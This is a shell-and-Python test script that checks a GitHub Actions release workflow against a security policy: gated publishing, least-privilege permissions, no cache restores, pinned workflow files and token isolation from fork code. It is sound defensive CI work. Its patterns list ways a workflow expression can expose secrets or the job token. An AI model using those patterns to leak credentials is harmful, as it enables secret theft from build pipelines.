#!/usr/bin/env bash
# The broken copies below are literal workflow text, ${{ }} and $VARIABLES included.
# shellcheck disable=SC2016
#
# Holds .github/workflows/release.yml, and the workflows it calls, to the release policy, which
# no run can show before a release:
#
# - the check job runs scripts/release-check.sh, unconditionally, and its outputs are that step's;
#   it then runs scripts/release-approval-check.sh, unconditionally, for the commit that check
#   accepted, and scripts/release-key-check.sh, unconditionally, with the key's fingerprint from
#   the repository variable RELEASE_KEY_FINGERPRINT;
# - publish runs only after check and build succeeded, in the maven-central environment, whose
#   reviewers approve every upload; no other job, here or in a called workflow, uses an
#   environment or reads a secret other than the job token;
# - publish restores no cache, and checks the tag again before the upload, as github-release
#   does before the release, which runs whenever publish succeeded;
# - publish keeps the bundle after the upload, also when the upload failed or the run was cancelled,
#   once per attempt, and github-release downloads the one whose publish succeeded;
# - publish checks, before the upload and unconditionally, that MAVEN_GPG_KEY is the checked key's
#   subkeys (scripts/release-signing-key-check.sh), the only step besides two that reads secrets;
# - each job has the permissions it needs and no more, next.yml read only; the version comes
#   from the check job; the two secret steps run exactly their commands;
# - next.yml, which runs pull requests' code, forks' included, holds contents: read and nothing
#   else - no packages - names no registry server and hands no step the job token.
#
# The jobs' if: conditions are evaluated over every combination of results, not compared as
# text. On top of the rules, the whole of release.yml is compared with its pinned form,
# scripts/release-workflow.json: any change to it has to update that file too, in the same
# reviewed change (scripts/release-workflow-test.sh --update writes it). next.yml, which a
# release calls and waits on, is pinned the same way, whole, in scripts/next-workflow.json.
# The rules stay for what
# they say when they fail. Then each rule is broken in a copy of the workflows, and the policy
# must refuse every copy for that rule, so a rule that stopped checking anything shows up too.
# next.yml runs it on every push. Needs python3 and yq.
set -euo pipefail

root=$(cd "$(dirname "$0")/.." && pwd)
work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT

cat > "$work/policy.py" <<'EOF'
import difflib, itertools, json, os, re, subprocess, sys

root, pinned_path, pinned_next_path = sys.argv[1], sys.argv[2], sys.argv[3]
problems = []

def load(path):
    out = subprocess.run(["yq", "-o=json", ".", path], check=True, capture_output=True, text=True)
    return json.loads(out.stdout)

def check(ok, message):
    if not ok:
        problems.append(message)

w = load(os.path.join(root, ".github/workflows/release.yml"))
jobs = w["jobs"]
RESULTS = ["success", "failure", "cancelled", "skipped"]

def needs(job):
    n = jobs[job].get("needs", [])
    return {n} if isinstance(n, str) else set(n)

def condition(job):
    """the job's if: as a Python function of (results, final, cancelled); none is success()"""
    text = jobs[job].get("if")
    if text is None:
        return lambda results, final, cancelled: not cancelled and all(
            results.get(n) == "success" for n in needs(job))
    text = str(text).strip()
    if text.startswith("${{") and text.endswith("}}"):
        text = text[3:-2]
    text = re.sub(r"\bneeds\.check\.outputs\.final\b", "final", text)
    text = re.sub(r"\bneeds\.([\w-]+)\.result\b", lambda m: "results[%r]" % m.group(1), text)
    text = text.replace("cancelled()", "cancelled").replace("always()", "True")
    text = text.replace("&&", " and ").replace("||", " or ")
    text = re.sub(r"!(?!=)", " not ", text)
    code = compile("(" + " ".join(text.split()) + ")", job + ".if", "eval")
    unknown = set(code.co_names) - {"results", "final", "cancelled", "True"}
    if unknown:
        problems.append("%s: cannot evaluate if: %s (%s)" % (job, jobs[job]["if"], ", ".join(sorted(unknown))))
        return None
    return lambda results, final, cancelled: bool(eval(code, {"__builtins__": {}},
        {"results": results, "final": final, "cancelled": cancelled}))

def environment(job_def):
    env = job_def.get("environment")
    return env.get("name") if isinstance(env, dict) else env

def steps(job):
    return jobs[job].get("steps", [])

def index(job, needle):
    for i, step in enumerate(steps(job)):
        if needle in json.dumps(step):
            return i
    return -1

def unconditional(job, step, what):
    check("if" not in step, "%s: %s must not be conditional" % (job, what))
    check("continue-on-error" not in step, "%s: %s must not continue on error" % (job, what))

# triggers: v1.* tags and nothing else
check(w.get("on") == {"push": {"tags": ["v1.*"]}}, "release.yml must run on v1.* tags only")
check(w.get("permissions") == {"contents": "read"}, "the workflow default must be contents: read")

# check: the release check runs, always, and the outputs are its own
CHECK = './scripts/release-check.sh "$GITHUB_REF_NAME"'
check("if" not in jobs["check"], "check must not be conditional")
check(not jobs["check"].get("continue-on-error"), "check must not continue on error")
found = [s for s in steps("check") if str(s.get("run", "")).strip() == CHECK]
check(len(found) == 1, "check must run %s as a step of its own, once" % CHECK)
if len(found) == 1:
    step = found[0]
    unconditional("check", step, "the release check")
    outputs = jobs["check"].get("outputs", {})
    for name in ("version", "final", "commit"):
        check(outputs.get(name) == "${{ steps.%s.outputs.%s }}" % (step.get("id"), name),
              "check's %s must be the release check's own output, not %r" % (name, outputs.get(name)))

# check: every pull request since the previous release was approved on its final commit, always,
# for the commit the release check accepted and after it: that check is what proves the commit is on
# main and what the tag names. The job has no secrets (below), so this runs before anything has one.
APPROVAL_CHECK = './scripts/release-approval-check.sh "$COMMIT"'
approval = [i for i, s in enumerate(steps("check")) if str(s.get("run", "")).strip() == APPROVAL_CHECK]
check(len(approval) == 1, "check must run %s as a step of its own, once" % APPROVAL_CHECK)
if len(approval) == 1 and len(found) == 1:
    step = steps("check")[approval[0]]
    unconditional("check", step, "the approval check")
    check(steps("check").index(found[0]) < approval[0], "check must run the approval check after the release check")
    check((step.get("env") or {}).get("COMMIT") == "${{ steps.%s.outputs.commit }}" % found[0].get("id"),
          "the approval check must take COMMIT from the release check's own output, not %r" % (step.get("env") or {}).get("COMMIT"))
    check((step.get("env") or {}).get("GH_TOKEN") == "${{ github.token }}",
          "the approval check must ask GitHub with the job token, not %r" % (step.get("env") or {}).get("GH_TOKEN"))

# check: the signing key is checked, always, with the fingerprint of the repository variable
KEY_CHECK = './scripts/release-key-check.sh'
found = [s for s in steps("check") if str(s.get("run", "")).strip() == KEY_CHECK]
check(len(found) == 1, "check must run %s as a step of its own, once" % KEY_CHECK)
if len(found) == 1:
    unconditional("check", found[0], "the signing key check")
    check(found[0].get("env", {}).get("RELEASE_KEY_FINGERPRINT") == "${{ vars.RELEASE_KEY_FINGERPRINT }}",
          "the signing key check must read RELEASE_KEY_FINGERPRINT from the repository variable, not %r"
          % found[0].get("env", {}).get("RELEASE_KEY_FINGERPRINT"))

# publish: after check and build succeeded, in the environment whose reviewers approve it
check(environment(jobs["publish"]) == "maven-central", "publish must use maven-central")
check({"check", "build"} <= needs("publish"), "publish must need check and build")
check(not jobs["publish"].get("continue-on-error"), "publish must not continue on error")
publish_if = condition("publish")
if publish_if:
    for check_result, build, final, cancelled in itertools.product(RESULTS, RESULTS, ["true", "false"], [False, True]):
        results = {"check": check_result, "build": build}
        runs = publish_if(results, final, cancelled)
        allowed = not cancelled and check_result == "success" and build == "success"
        check(runs == allowed, "publish with check=%s build=%s final=%s cancelled=%s: runs=%s, should be %s"
              % (check_result, build, final, cancelled, runs, allowed))

# github-release: whenever publish succeeded, final or not
check("publish" in needs("github-release"), "github-release must need publish")
check(not jobs["github-release"].get("continue-on-error"), "github-release must not continue on error")
release_if = condition("github-release")
if release_if:
    for publish, final, cancelled in itertools.product(RESULTS, ["true", "false"], [False, True]):
        results = {"check": "success", "build": "success", "publish": publish}
        runs = release_if(results, final, cancelled)
        check(runs == (publish == "success" and not cancelled),
              "github-release with publish=%s final=%s cancelled=%s: runs=%s" % (publish, final, cancelled, runs))

# Secrets and environments: publish alone, here and in every workflow these jobs call, however
# deep. A called workflow runs on the tag too, so maven-central would admit it.
#
# A secret is read through an expression: ${{ }} anywhere, or an if: without it. Any use of the
# secrets context there counts - secrets.X, secrets['X'], secrets[format(...)], toJSON(secrets),
# bare secrets - except secrets.GITHUB_TOKEN, the job token. Expressions ignore case, so
# Secrets['X'] and SECRETS.X count too.
def expressions(value, key=None):
    if isinstance(value, dict):
        for k, v in value.items():
            yield from expressions(v, k)
    elif isinstance(value, list):
        for v in value:
            yield from expressions(v)
    elif isinstance(value, str):
        yield from re.findall(r"\$\{\{(.*?)\}\}", value, re.S)
        if key == "if" and "${{" not in value:
            yield value

def secret_reads(value, allow_token=True):
    reads = []
    for expression in expressions(value):
        for m in re.finditer(r"\bsecrets\b", expression, re.I):
            rest = expression[m.end():]
            if allow_token and re.match(r"\s*\.\s*GITHUB_TOKEN\b", rest, re.I):
                continue
            reads.append(expression.strip())
    return reads

def isolated(where, job_def, allowed_environment=None):
    if allowed_environment is None:
        check(environment(job_def) is None, "%s must not use an environment" % where)
        reads = secret_reads(job_def)
        check(not reads, "%s must not read secrets: %s" % (where, "; ".join(reads)))
    check(job_def.get("secrets") is None, "%s must not pass secrets on" % where)

def workflow_level(where, workflow):
    # env and defaults here reach every job; no secret at all, not even the job token
    rest = {k: v for k, v in workflow.items() if k != "jobs"}
    reads = secret_reads(rest, allow_token=False)
    check(not reads, "%s must not read secrets outside its jobs: %s" % (where, "; ".join(reads)))

seen = set()
def called(where, job_def):
    uses = job_def.get("uses", "")
    if not uses.startswith("./.github/workflows/"):
        check(not uses.startswith(".") and "/.github/workflows/" not in uses,
              "%s calls a workflow this test cannot follow: %s" % (where, uses))
        return
    path = os.path.join(root, uses[2:])
    if path in seen:
        return
    seen.add(path)
    nested_workflow = load(path)
    workflow_level(uses, nested_workflow)
    for name, nested in nested_workflow.get("jobs", {}).items():
        isolated("%s > %s" % (uses, name), nested)
        called("%s > %s" % (uses, name), nested)

workflow_level("release.yml", w)
for name, job_def in jobs.items():
    isolated(name, job_def, "maven-central" if name == "publish" else None)
    called(name, job_def)

# publish: the token and the key only on the three steps that need them, named by id - the secrets
# check, the signing key check and the upload - each there once, and not on the job
SECRET_STEPS = ("secrets", "signing-key", "upload")
publish_level = {k: v for k, v in jobs["publish"].items() if k != "steps"}
check(not secret_reads(publish_level), "publish must read secrets on its steps only, not as a job")
for step_id in SECRET_STEPS:
    count = sum(1 for step in steps("publish") if step.get("id") == step_id)
    check(count == 1, "publish must have one step with id %s, found %d" % (step_id, count))
for step in steps("publish"):
    if secret_reads(step) and step.get("id") not in SECRET_STEPS:
        problems.append("publish: only the steps with id secrets, signing-key and upload may read secrets, not %r" % step.get("name"))
# the signing key check: the one step that looks at what MAVEN_GPG_KEY is, always, before the upload,
# with the key from the secret and the fingerprint from the variable the check job looked up
SIGNING_KEY_CHECK = "./scripts/release-signing-key-check.sh"
signing = [step for step in steps("publish") if step.get("id") == "signing-key"]
if len(signing) == 1:
    check(str(signing[0].get("run", "")).strip() == SIGNING_KEY_CHECK,
          "publish: the signing key step must run %s and nothing else, not %r" % (SIGNING_KEY_CHECK, signing[0].get("run")))
    unconditional("publish", signing[0], "the signing key check")
    check(signing[0].get("env") == {"MAVEN_GPG_KEY": "${{ secrets.MAVEN_GPG_KEY }}",
                                    "RELEASE_KEY_FINGERPRINT": "${{ vars.RELEASE_KEY_FINGERPRINT }}"},
          "publish: the signing key check must read MAVEN_GPG_KEY from the secret and RELEASE_KEY_FINGERPRINT from the repository variable, not %r"
          % signing[0].get("env"))
    signing_index = [i for i, step in enumerate(steps("publish")) if step.get("id") == "signing-key"][0]
    upload_at = [i for i, step in enumerate(steps("publish")) if step.get("id") == "upload"]
    check(upload_at and signing_index < upload_at[0], "publish must check the signing key before it deploys")
upload = [step for step in steps("publish") if step.get("id") == "upload"]
if upload:
    check(re.match(r"\./mvnw .*-Prelease .*\bdeploy$", " ".join(str(upload[0].get("run", "")).split())) is not None,
          "publish: the upload step must run ./mvnw -Prelease ... deploy, not %r" % upload[0].get("run"))

# publish: the bundle is kept after the upload, whether it succeeded, failed or was cancelled - a
# wait for Central that timed out, or was cancelled, leaves the version published and the bundle the
# only copy of what was uploaded. It is kept under the name of its attempt and never overwritten: a
# re-run builds another bundle, which Central refuses, and must not replace the first attempt's. The
# job's output names it, and github-release downloads that one, from whichever attempt it runs in. A
# step's if: is evaluated, as the jobs' are, over a failed earlier step and a cancelled run; none is
# success().
BUNDLE = "central-bundle-${{ github.run_attempt }}"
def keeps_bundle(step):
    return str(step.get("uses", "")).startswith("actions/upload-artifact@") and str((step.get("with") or {}).get("name", "")).startswith("central-bundle")

def step_runs(step, failed, cancelled):
    text = step.get("if")
    if text is None:
        return not failed and not cancelled
    text = str(text).strip()
    if text.startswith("${{") and text.endswith("}}"):
        text = text[3:-2]
    text = re.sub(r"\b(success|failure|cancelled|always)\(\)", lambda m: m.group(1) + "_", text)
    text = text.replace("&&", " and ").replace("||", " or ")
    text = re.sub(r"!(?!=)", " not ", text)
    code = compile("(" + " ".join(text.split()) + ")", "keep.if", "eval")
    unknown = set(code.co_names) - {"success_", "failure_", "cancelled_", "always_"}
    if unknown:
        problems.append("publish: cannot evaluate the bundle step's if: %s (%s)" % (step["if"], ", ".join(sorted(unknown))))
        return None
    return bool(eval(code, {"__builtins__": {}}, {
        "success_": not failed and not cancelled, "failure_": failed and not cancelled,
        "cancelled_": cancelled, "always_": True}))

keep = [i for i, step in enumerate(steps("publish")) if keeps_bundle(step)]
check(len(keep) == 1, "publish must keep the central-bundle artifact once, found %d" % len(keep))
for i in keep:
    check(any(step.get("id") == "upload" for step in steps("publish")[:i]), "publish must keep the bundle after the upload")
    for failed in (False, True):
        runs = step_runs(steps("publish")[i], failed, False)
        check(runs is None or runs, "publish must keep the bundle also after a failed upload: runs=%s with the upload %s"
              % (runs, "failed" if failed else "succeeded"))
        runs = step_runs(steps("publish")[i], failed, True)
        check(runs is None or runs, "publish must keep the bundle also when the run is cancelled: runs=%s with the upload %s"
              % (runs, "failed" if failed else "succeeded"))
    with_ = steps("publish")[i].get("with") or {}
    check(with_.get("name") == BUNDLE, "publish must keep the bundle as %s, one per attempt, not %r" % (BUNDLE, with_.get("name")))
    check("overwrite" not in with_, "publish must not overwrite a bundle an earlier attempt kept: overwrite is %r" % with_.get("overwrite"))
    check("continue-on-error" not in steps("publish")[i], "publish: keeping the bundle must not continue on error")
bundle_output = (jobs["publish"].get("outputs") or {}).get("bundle")
check(bundle_output == BUNDLE, "publish must output the bundle's name, %s, not %r" % (BUNDLE, bundle_output))
check(any(step.get("uses", "").startswith("actions/download-artifact@")
          and (step.get("with") or {}).get("name") == "${{ needs.publish.outputs.bundle }}"
          for step in steps("github-release")),
      "github-release must download the artifact named by ${{ needs.publish.outputs.bundle }}")

# publish and github-release work on the commit check accepted, checked out first, before anything
# runs from it; the tag may name another commit by then
CHECKED = "${{ needs.check.outputs.commit }}"
for job in ("publish", "github-release"):
    checkouts = [i for i, step in enumerate(steps(job)) if str(step.get("uses", "")).startswith("actions/checkout@")]
    check(checkouts == [0], "%s must check out once, as its first step, found %s" % (job, checkouts))
    for i in checkouts:
        ref = (steps(job)[i].get("with") or {}).get("ref")
        check(ref == CHECKED, "%s must check out %s, not %r" % (job, CHECKED, ref))

# publish: no cache another job could have written - no cache action in any form, no cache input
# on any setup action
for step in steps("publish"):
    uses = step.get("uses", "")
    check(not re.match(r"actions/cache([/@]|$)", uses), "publish must not restore a cache: %s" % uses)
    inputs = step.get("with", {}) or {}
    check(not any(key == "cache" or key.startswith("cache-") for key in inputs),
          "publish must not restore a cache: %s with %s" % (uses or step.get("name"), sorted(inputs)))

# the tag checked again before the upload and before the release, and a failed check stops the job
TAG_CHECK = './scripts/release-tag-check.sh "$GITHUB_REF_NAME" "$COMMIT"'
for job in ("publish", "github-release"):
    found = [step for step in steps(job) if "release-tag-check.sh" in json.dumps(step)]
    check(len(found) == 1, "%s must check the tag once, found %d" % (job, len(found)))
    for step in found:
        check(str(step.get("run", "")).strip() == TAG_CHECK,
              "%s: the tag check must run %s and nothing else, not %r" % (job, TAG_CHECK, step.get("run")))
        unconditional(job, step, "the tag check")
        commit = (step.get("env") or {}).get("COMMIT")
        check(commit == "${{ needs.check.outputs.commit }}",
              "%s: the tag check's COMMIT must be ${{ needs.check.outputs.commit }}, not %r" % (job, commit))
upload_index = next((i for i, step in enumerate(steps("publish")) if step.get("id") == "upload"), -1)
check(-1 < index("publish", "release-tag-check.sh") < upload_index,
      "publish must check the tag again before it deploys")
RELEASE_STEPS = [i for i, step in enumerate(steps("github-release")) if str(step.get("run", "")).strip() == "./scripts/release-github.sh"]
check(len(RELEASE_STEPS) == 1, "github-release must create the release with ./scripts/release-github.sh, once")
for i in RELEASE_STEPS:
    unconditional("github-release", steps("github-release")[i], "creating the release")
check(-1 < index("github-release", "release-tag-check.sh") < (RELEASE_STEPS or [-1])[0],
      "github-release must check the tag again before it creates the release")

# Job permissions: no more than each job needs. In next.yml, which runs on the tag too, read only.
EXPECTED_PERMISSIONS = {
    "check": {"contents": "read", "pull-requests": "read"},
    "build": {"contents": "read"},
    "publish": {"contents": "read"},
    "github-release": {"contents": "write"},
}
for name, expected in EXPECTED_PERMISSIONS.items():
    actual = jobs[name].get("permissions")
    if name == "publish" and actual is None:
        continue
    check(actual == expected, "%s's permissions must be %s, not %s" % (name, expected, actual))
check(set(jobs) == set(EXPECTED_PERMISSIONS), "release.yml must have the jobs %s, not %s"
      % (sorted(EXPECTED_PERMISSIONS), sorted(jobs)))

def read_only(where, permissions):
    if permissions is None:
        return
    if isinstance(permissions, str):
        check(permissions in ("read-all", "none") or permissions == "{}", "%s's permissions must be read-only, not %s" % (where, permissions))
        return
    writes = sorted(k for k, v in permissions.items() if v not in ("read", "none"))
    check(not writes, "%s's permissions must be read-only, not write on %s" % (where, ", ".join(writes)))

for path in sorted(seen):
    nested_workflow = load(path)
    where = "./" + os.path.relpath(path, root)
    read_only(where, nested_workflow.get("permissions"))
    for name, nested in nested_workflow.get("jobs", {}).items():
        read_only("%s > %s" % (where, name), nested.get("permissions"))

# build: next.yml, at the version the release check gave
check(jobs["build"].get("uses") == "./.github/workflows/next.yml",
      "build must call ./.github/workflows/next.yml, not %r" % jobs["build"].get("uses"))
BUILD_WITH = {"revision": "${{ needs.check.outputs.version }}", "commit": "${{ needs.check.outputs.commit }}"}
check(jobs["build"].get("with") == BUILD_WITH,
      "build must pass revision: ${{ needs.check.outputs.version }} and commit: ${{ needs.check.outputs.commit }}, "
      "not %r" % jobs["build"].get("with"))
# and next.yml builds at that version: its build step hands inputs.revision to Maven as -Drevision
BUILD_RUN = "./mvnw --batch-mode --no-transfer-progress ${REVISION:+-Drevision=$REVISION} verify"
for path in sorted(seen):
    builds = [step for job_def in load(path).get("jobs", {}).values() for step in job_def.get("steps", [])
              if " ".join(str(step.get("run", "")).split()) == BUILD_RUN]
    check(len(builds) == 1, "./%s must build once with: %s" % (os.path.relpath(path, root), BUILD_RUN))
    for step in builds:
        check((step.get("env") or {}).get("REVISION") == "${{ inputs.revision }}",
              "./%s: the build's REVISION must be ${{ inputs.revision }}, not %r"
              % (os.path.relpath(path, root), (step.get("env") or {}).get("REVISION")))
# and next.yml tests the 1.0 SDK it builds, on every run, and checks that it did
NEXT_RUN = ("./mvnw --batch-mode --no-transfer-progress ${REVISION:+-Drevision=$REVISION} -Dsdk.next -pl system-tests -am"
            " verify '-Dtest=com/oddin/oddsfeed/systemtests/**/*Test' -Dsurefire.failIfNoSpecifiedTests=false"
            " -Djacoco.skip=true")
for path in sorted(seen):
    if os.path.basename(path) != "next.yml":
        continue
    where = "./%s" % os.path.relpath(path, root)
    nested = load(path).get("jobs", {}).get("system-tests-next")
    check(nested is not None, "%s must have the job system-tests-next" % where)
    if nested is None:
        continue
    check("if" not in nested, "%s > system-tests-next must not be conditional" % where)
    check(not nested.get("continue-on-error"), "%s > system-tests-next must not continue on error" % where)
    runs = [step for step in nested.get("steps", []) if " ".join(str(step.get("run", "")).split()) == NEXT_RUN]
    check(len(runs) == 1, "%s > system-tests-next must test 1.0 once with: %s" % (where, NEXT_RUN))
    for step in runs:
        unconditional("system-tests-next", step, "the 1.0 run")
        check((step.get("env") or {}).get("REVISION") == "${{ inputs.revision }}",
              "%s > system-tests-next: REVISION must be ${{ inputs.revision }}" % where)
    loaded = [step for step in nested.get("steps", []) if "theSdkIsTheOneThisReactorBuilt" in str(step.get("run", ""))]
    check(len(loaded) == 1, "%s > system-tests-next must check that the 1.0 version test ran" % where)
    for step in loaded:
        unconditional("system-tests-next", step, "the version test check")
    # the order of its steps, and the version check's own text, are held by the pin below
    check(nested.get("permissions") == {"contents": "read"},
          "%s > system-tests-next must hold contents: read and nothing else, not %r" % (where, nested.get("permissions")))
    for step in nested.get("steps", []):
        uses, with_ = str(step.get("uses", "")), step.get("with") or {}
        check(not re.match(r"actions/cache([/@]|$)", uses), "%s > system-tests-next must restore no cache: %s" % (where, uses))
        keys = [k for k in with_ if k == "cache" or k.startswith("cache-") or k.startswith("server-")]
        check(not keys, "%s > system-tests-next must restore no cache and name no registry server: %s"
              % (where, ", ".join(keys)))
    # the stress job: there, on every run, running the tagged scenarios, and checking that it did
    stress = load(path).get("jobs", {}).get("stress")
    check(stress is not None, "%s must have the job stress" % where)
    if stress is not None:
        check("if" not in stress, "%s > stress must not be conditional" % where)
        check(not stress.get("continue-on-error"), "%s > stress must not continue on error" % where)
        check(stress.get("timeout-minutes") == 10, "%s > stress must stop after 10 minutes, not %r" % (where, stress.get("timeout-minutes")))
        check(stress.get("permissions") == {"contents": "read"},
              "%s > stress must hold contents: read and nothing else, not %r" % (where, stress.get("permissions")))
        stress_steps = stress.get("steps", [])
        ran = [step for step in stress_steps if "-Dgroups=stress" in str(step.get("run", ""))]
        check(len(ran) == 1 and "-Dstress.excluded=none" in str(ran[0].get("run", "")),
              "%s > stress must run the stress scenarios once, with -Dgroups=stress -Dstress.excluded=none" % where)
        counted = [step for step in stress_steps if "stress scenarios were skipped" in str(step.get("run", ""))]
        check(len(counted) == 1, "%s > stress must check that the scenarios ran and none was skipped" % where)
        for step in ran + counted:
            unconditional("stress", step, "the stress run and its check")
        uploads = [step for step in stress_steps if str(step.get("uses", "")).startswith("actions/upload-artifact@")]
        check(len(uploads) == 1 and uploads[0].get("if") == "always()",
              "%s > stress must upload its reports whatever the outcome" % where)
        for step in stress_steps:
            uses, with_ = str(step.get("uses", "")), step.get("with") or {}
            check(not re.match(r"actions/cache([/@]|$)", uses), "%s > stress must restore no cache: %s" % (where, uses))
            keys = [k for k in with_ if k == "cache" or k.startswith("cache-") or k.startswith("server-")]
            check(not keys, "%s > stress must restore no cache and name no registry server: %s"
                  % (where, ", ".join(keys)))
    # next.yml runs every pull request's code, a fork's included, and a token in reach of that code
    # is the fork's: contents: read and nothing else (the legacy SDK comes from its public release),
    # no registry server for Maven to authenticate to, and no step given the job token
    next_workflow = load(path)
    check(next_workflow.get("permissions") == {"contents": "read"},
          "%s must grant contents: read and nothing else, not %r" % (where, next_workflow.get("permissions")))
    for name, job_def in next_workflow.get("jobs", {}).items():
        permissions = job_def.get("permissions")
        check(permissions in (None, {"contents": "read"}),
              "%s > %s must hold contents: read and nothing else, not %r" % (where, name, permissions))
        for step in job_def.get("steps", []):
            servers = sorted(k for k in (step.get("with") or {}) if k.startswith("server-"))
            check(not servers, "%s > %s must name no registry server: %s" % (where, name, ", ".join(servers)))
    # The job token is github.token, and secrets.GITHUB_TOKEN. next.yml needs no secret at all, so
    # the whole workflow is searched, its env and defaults too, which reach every job, and any use of
    # the secrets context counts, indexed or not. So does any use of the github context but a
    # property other than token by name: github['token'], github[format(...)], toJSON(github) and
    # bare github hand the token on as surely as github.token. Expressions ignore case, so this
    # does too.
    CODEOWNERS_RUN = r"""response=$(gh api "repos/$REPOSITORY/codeowners/errors?ref=$REF")
count=$(jq -e '.errors | arrays | length' <<<"$response") || {
  echo "GitHub's answer holds no list of CODEOWNERS errors: $response" >&2
  exit 1
}
if [ "$count" -ne 0 ]; then
  jq -r '.errors[] | "\(.path):\(.line): \(.kind): \(.message)"' <<<"$response" >&2
  echo "GitHub rejects $count line(s) of CODEOWNERS" >&2
  exit 1
fi
echo "GitHub reads every line of CODEOWNERS"
"""
    def token_reads(value):
        return [e.strip() for e in expressions(value)
                if re.search(r"\bsecrets\b", e, re.I)
                or any(not re.match(r"\s*\.\s*(?!token\b)[a-z_][\w-]*", e[m.end():], re.I)
                       for m in re.finditer(r"(?<![\w.-])github(?![\w-])", e, re.I))]
    # One job is the exception: codeowners, which asks GitHub whether it accepts CODEOWNERS and
    # needs the token for that call alone. It checks nothing out and runs nothing of the
    # repository's, a single script step, so there is no code of a pull request in its reach.
    others = dict(next_workflow, jobs={n: j for n, j in next_workflow.get("jobs", {}).items() if n != "codeowners"})
    tokens = token_reads(others)
    check(not tokens, "%s must not hand its steps the job token: %s" % (where, "; ".join(tokens)))
    ask = next_workflow.get("jobs", {}).get("codeowners")
    check(ask is not None, "%s must have the job codeowners" % where)
    if ask is not None:
        check("if" not in ask, "%s > codeowners must not be conditional" % where)
        check(not ask.get("continue-on-error"), "%s > codeowners must not continue on error" % where)
        check(ask.get("permissions") == {"contents": "read"},
              "%s > codeowners must hold contents: read and nothing else, not %r" % (where, ask.get("permissions")))
        ask_steps = ask.get("steps", [])
        check(len(ask_steps) == 1 and "uses" not in ask_steps[0] and "codeowners/errors" in str(ask_steps[0].get("run", "")),
              "%s > codeowners must be one script step that asks GitHub for the CODEOWNERS errors, nothing checked out" % where)
        # the script itself, to the letter: it runs with the job token in its environment, so a command
        # added to it would run with the token, and nothing short of the whole text is allowed
        for step in ask_steps:
            check(str(step.get("run", "")).strip() == CODEOWNERS_RUN.strip(),
                  "%s > codeowners must run exactly the script this test holds, with nothing added to it" % where)
        for step in ask_steps:
            unconditional("codeowners", step, "the CODEOWNERS check")
            check((step.get("env") or {}).get("GH_TOKEN") == "${{ github.token }}",
                  "%s > codeowners must call GitHub with GH_TOKEN: ${{ github.token }}" % where)
            without_token = dict(step, env={k: v for k, v in (step.get("env") or {}).items() if k != "GH_TOKEN"})
            ask_tokens = token_reads(dict(ask, steps=[without_token]))
            check(not ask_tokens, "%s > codeowners must hand the job token to GH_TOKEN only: %s" % (where, "; ".join(ask_tokens)))
    # CI runs for both branches while `next` is renamed to `main`, and for the one that is left
    # after it: each trigger lists both, said here apart from the pinned form, which is regenerated
    for event in ("pull_request", "push"):
        branches = ((next_workflow.get("on") or {}).get(event) or {}).get("branches") or []
        check(sorted(branches) == ["main", "next"],
              "%s > on %s must run for next and main, not %r" % (where, event, branches))
    # the head of the pull request, which the merge commit of the event may not be a ref for
    ask_env = ((next_workflow.get("jobs", {}).get("codeowners") or {}).get("steps") or [{}])[0].get("env") or {}
    check(ask_env.get("REF") == "${{ github.event.pull_request.head.sha || github.sha }}",
          "%s > codeowners must ask about REF: ${{ github.event.pull_request.head.sha || github.sha }}, not %r"
          % (where, ask_env.get("REF")))
    # the build job resolves CODEOWNERS the way GitHub does, once, on every run
    owners_steps = [step for step in (next_workflow.get("jobs", {}).get("build") or {}).get("steps", [])
                    if str(step.get("run", "")).strip() == "./scripts/release-codeowners-test.sh"]
    check(len(owners_steps) == 1, "%s > build must run ./scripts/release-codeowners-test.sh, once" % where)
    for step in owners_steps:
        unconditional("build", step, "the CODEOWNERS ownership test")
    # and the whole of next.yml against its pinned form, as release.yml below
    actual_next = json.dumps(load(path), indent=2, sort_keys=True) + "\n"
    pinned_next = open(pinned_next_path).read()
    if actual_next != pinned_next:
        diff = "".join(difflib.unified_diff(pinned_next.splitlines(True), actual_next.splitlines(True),
                                             "scripts/next-workflow.json", "next.yml"))
        problems.append("next.yml differs from its pinned form in scripts/next-workflow.json; if the "
                        "change is meant, update it with scripts/release-workflow-test.sh --update:\n" + diff)

# the schema drift workflow judges the 0.x line and the 1.0 line by their names after the rename
drift_path = os.path.join(root, ".github/workflows/schema-drift.yml")
drift_runs = []
if os.path.exists(drift_path):
    drift_runs = [str(step.get("run", "")).strip()
                  for step in ((load(drift_path).get("jobs", {}).get("drift") or {}).get("steps") or [])
                  if "schema-drift.sh" in str(step.get("run", ""))]
check(drift_runs == ["scripts/schema-drift.sh release/0.x main"],
      "schema-drift.yml > drift must compare the pins with: scripts/schema-drift.sh release/0.x main, not %r" % drift_runs)

# and every job there that checks out checks, once, unconditionally and right after the checkout,
# that the checkout left no credential behind
GUARD = "Check the checkout left no credentials behind"
for path in sorted(seen):
    for name, nested in load(path).get("jobs", {}).items():
        steps_ = nested.get("steps", [])
        checkouts = [i for i, step in enumerate(steps_) if str(step.get("uses", "")).startswith("actions/checkout@")]
        if not checkouts:
            continue
        where = "./%s > %s" % (os.path.relpath(path, root), name)
        guards = [i for i, step in enumerate(steps_) if step.get("name") == GUARD]
        check(len(guards) == 1, "%s must check once that its checkout left no credentials behind" % where)
        check(guards == [checkouts[0] + 1] and len(checkouts) == 1,
              "%s must check its checkout for credentials in the step right after it" % where)
        for i in guards:
            unconditional(name, steps_[i], "the credential guard")
# and next.yml builds that commit: every checkout there takes it
for path in sorted(seen):
    for name, nested in load(path).get("jobs", {}).items():
        for step in nested.get("steps", []):
            if str(step.get("uses", "")).startswith("actions/checkout@"):
                ref = (step.get("with") or {}).get("ref")
                check(ref == "${{ inputs.commit }}", "./%s > %s must check out ${{ inputs.commit }}, not %r"
                      % (os.path.relpath(path, root), name, ref))

# the version and the release's kind come from the check job, nowhere else
VERSION = "${{ needs.check.outputs.version }}"
for job in ("publish", "github-release"):
    for step in steps(job):
        env = step.get("env") or {}
        if "VERSION" in env:
            check(env["VERSION"] == VERSION, "%s: %r takes VERSION from %r, not %s" % (job, step.get("name"), env["VERSION"], VERSION))
        if "FINAL" in env:
            check(env["FINAL"] == "${{ needs.check.outputs.final }}", "%s: FINAL must be the check job's output" % job)
    job_def = {k: v for k, v in jobs[job].items() if k != "concurrency"}
    refs = [e.strip() for e in expressions(job_def) if re.search(r"\bgithub\.(ref|ref_name|sha)\b", e)]
    check(not refs, "%s must take the version, tag and commit from the check job, not %s" % (job, "; ".join(refs)))

# the two secret steps, command for command
SECRETS_RUN = " ".join("""missing=0
for name in CENTRAL_TOKEN_USERNAME CENTRAL_TOKEN_PASSWORD MAVEN_GPG_KEY MAVEN_GPG_PASSPHRASE; do
  if [ -z "${!name}" ]; then
